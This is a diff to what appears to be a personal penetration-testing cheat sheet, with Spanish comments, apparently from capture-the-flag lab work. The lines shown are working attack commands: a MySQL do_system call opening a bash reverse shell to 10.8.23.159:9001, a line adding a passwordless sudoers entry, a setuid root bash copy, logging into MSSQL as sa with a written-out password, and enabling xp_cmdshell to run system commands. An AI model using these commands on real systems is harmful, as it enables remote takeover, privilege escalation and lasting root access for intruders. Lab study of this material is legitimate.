@@ -79,3 +79,19 @@ select do_system('bash -i >& /dev/tcp/10.8.23.159/9001 0>&1'); #bash rev shell
 select do_system('echo "smeagol ALL =(ALL) NOPASSWD: ALL" >> /etc/sudoers'); # modificando /etc/sudoers
 select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
 /tmp/rootbash -p # root shell
+
+#mssql server windows enum:
+sqsh -S MACHINE_IP -U sa -P t7uLKzddQzVjVFJp
+
+1> SELECT * FROM reindeer.dbo.names;
+2> go
+
+1> xp_cmdshell 'whoami';
+2> go
+
+# Activar xp_cmdshell con sp_configure
+EXEC sp_configure 'show advanced options', '1'
+RECONFIGURE
+-- activando xp_cmdshell
+EXEC sp_configure 'xp_cmdshell', '1' 
+RECONFIGURE
